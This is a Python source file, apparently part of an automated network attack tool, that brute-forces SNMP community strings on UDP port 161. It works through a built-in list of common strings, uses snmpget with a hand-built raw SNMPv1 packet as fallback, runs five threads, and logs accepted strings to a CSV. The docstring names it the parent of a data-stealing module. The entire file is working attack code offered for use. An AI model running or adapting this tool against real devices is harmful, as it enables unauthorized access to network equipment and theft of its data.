"""
snmp_connector.py - Brute forces SNMP community strings on port 161 and records
found community strings. Uses snmpget/snmpwalk CLI tools if available, with a
raw UDP fallback. Parent for steal_data_snmp.py.
"""

import os
import csv
import socket
import subprocess
import threading
import logging
import time
import pandas as pd
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

logger = Logger(name="snmp_connector.py", level=logging.DEBUG)

b_class = "SNMPBruteforce"
b_module = "snmp_connector"
b_status = "brute_force_snmp"
b_port = 161
b_parent = None

SNMP_COMMUNITIES = [
    "public", "private", "community", "default", "admin", "manager",
    "security", "cisco", "router", "switch", "snmp", "monitor",
    "read", "write", "guest", "test", "internal", "secret",
    "network", "all", "0", "password", "access", "enable",
]


class SNMPBruteforce:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.snmp_connector = SNMPConnector(shared_data)
        logger.info("SNMPConnector initialized.")

    def bruteforce_snmp(self, ip, port):
        return self.snmp_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        logger.info(f"Executing SNMPBruteforce on {ip}:{port}...")
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.snmpfile, ip
        )
        if existing_creds:
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing SNMP community strings verified for {ip}")
                return 'success'
            logger.warning(f"Existing SNMP credentials for {ip} no longer valid, re-bruteforcing")

        self.shared_data.ragnarorch_status = "SNMPBruteforce"
        time.sleep(2)
        success, results = self.bruteforce_snmp(ip, port)
        return 'success' if success else 'failed'

    def _verify_credentials(self, ip, credentials):
        for community, _ in credentials:
            if self.snmp_connector.snmp_check(ip, community):
                return True
        return False


class SNMPConnector:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.snmpfile = shared_data.snmpfile
        if not os.path.exists(self.snmpfile):
            with open(self.snmpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,Community,Version,Port\n")
        self.results = []
        self.lock = threading.Lock()
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        try:
            data = self.shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
        except Exception as e:
            logger.warning(f"Could not read scan data: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("161", na=False)]

    def snmp_check(self, ip, community, version="1"):
        """Test a community string using snmpget; fall back to raw UDP."""
        try:
            result = subprocess.run(
                ["snmpget", "-v", version, "-c", community, "-t", "2", "-r", "0",
                 ip, "1.3.6.1.2.1.1.1.0"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and "STRING:" in result.stdout:
                logger.debug(f"SNMP community '{community}' accepted by {ip} (v{version})")
                return True
        except FileNotFoundError:
            return self._snmp_check_raw(ip, community)
        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            logger.debug(f"SNMP check error for {ip}: {e}")
        return False

    def _snmp_check_raw(self, ip, community):
        """Raw UDP SNMPv1 GetRequest for sysDescr.0 — no external tools required."""
        try:
            comm = community.encode()
            # Minimal BER-encoded SNMPv1 GetRequest for OID 1.3.6.1.2.1.1.1.0
            oid = b'\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00'
            varbind = b'\x30' + bytes([len(oid) + 4]) + oid + b'\x05\x00'
            varbind_list = b'\x30' + bytes([len(varbind)]) + varbind
            pdu_inner = b'\x02\x01\x00\x02\x01\x00\x02\x01\x00' + varbind_list
            pdu = b'\xa0' + bytes([len(pdu_inner)]) + pdu_inner
            community_field = b'\x04' + bytes([len(comm)]) + comm
            version_field = b'\x02\x01\x00'
            message_inner = version_field + community_field + pdu
            message = b'\x30' + bytes([len(message_inner)]) + message_inner

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(message, (ip, 161))
            resp, _ = sock.recvfrom(4096)
            sock.close()
            return len(resp) > 20
        except Exception:
            return False

    def worker(self, progress, task_id, success_flag):
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                break
            ip, community, mac, hostname, port = self.queue.get()
            if self.snmp_check(ip, community):
                with self.lock:
                    self.results.append([mac, ip, hostname, community, "v1", port])
                    logger.success(f"SNMP community '{community}' accepted by {ip}")
                    self.save_results()
                    self.remove_duplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()
        try:
            mac = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
            hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
        except IndexError:
            mac, hostname = "unknown", "unknown"

        for community in SNMP_COMMUNITIES:
            if self.shared_data.orchestrator_should_exit:
                return False, []
            self.queue.put((adresse_ip, community, mac, hostname, port))

        success_flag = [False]
        threads = []
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SNMP...", total=len(SNMP_COMMUNITIES))
            for _ in range(5):
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)
            self.queue.join()
            for t in threads:
                t.join()

        return success_flag[0], self.results

    def save_results(self):
        with open(self.snmpfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []

    def remove_duplicates(self):
        df = pd.read_csv(self.snmpfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.snmpfile, index=False)


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        snmp_bruteforce = SNMPBruteforce(shared_data)
        logger.info("Starting SNMP community string attack on port 161")
        for row in shared_data.read_data():
            ip = row["IPs"]
            snmp_bruteforce.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
